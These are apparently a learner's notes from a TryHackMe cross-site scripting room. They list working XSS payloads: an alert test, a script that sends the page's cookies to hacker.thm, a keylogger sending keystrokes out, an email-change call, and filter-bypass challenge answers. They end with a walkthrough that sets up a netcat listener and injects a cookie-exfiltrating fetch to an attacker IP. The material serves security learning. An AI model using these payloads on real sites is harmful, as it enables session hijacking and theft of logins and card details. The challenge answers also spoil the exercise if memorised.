# XSS

Proof Of Concept:

This is the simplest of payloads where all you want to do is demonstrate that you can achieve XSS on a website. This is often done by causing an alert box to pop up on the page with a string of text, for example:



<script>alert('XSS');</script>

Session Stealing:

Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. Once the hacker has these cookies, they can take over the target's session and be logged as that user.



<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>

Key Logger:

The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.



<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>

Business Logic:

This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called user.changeEmail(). Your payload could look like this:



<script>user.changeEmail('attacker@hacker.thm');</script>

# CHALLENGES
1  <script>alert('THM');</script>
2 "><script>alert('THM');</script>
3 </textarea><script>alert('THM');</script>
4 ';alert('THM');// The ' closes the field specifying the name, then ; signifies the end of the current command, and the // at the end makes anything after it a comment rather than executable code.
5 <sscriptcript>alert('THM');</sscriptcript> we use sscriptcript because website have filter and after deleting script We still have one more "script"
6 /images/cat.jpg" onload="alert('THM'); 
# PRACTICAL EXAMPLE 
in this challange we used <textarea> to catch another persons cookie
also  I set up a listening server using Netcat. netcat -nlvp 9001 to listening 9001 port 
after this I use payload "</textarea><script>fetch('http://URL_OR_IP:PORT_NUMBER?cookie=' + btoa(document.cookie) );</script>"
Let’s break down the payload:

The </textarea> tag closes the text area field.
The <script> tag opens an area for us to write JavaScript.
The fetch() command makes an HTTP request.
URL_OR_IP is either the THM request catcher URL, your IP address from the THM AttackBox, or your IP address on the THM VPN Network.
PORT_NUMBER is the port number you are using to listen for connections on the AttackBox.
?cookie= is the query string containing the victim’s cookies.
btoa() command base64 encodes the victim’s cookies.
document.cookie accesses the victim’s cookies for the Acme IT Support Website.
</script>closes the JavaScript code block.
after this i write my ip address and also port number and catch cookie and decrypt in base64 that's all
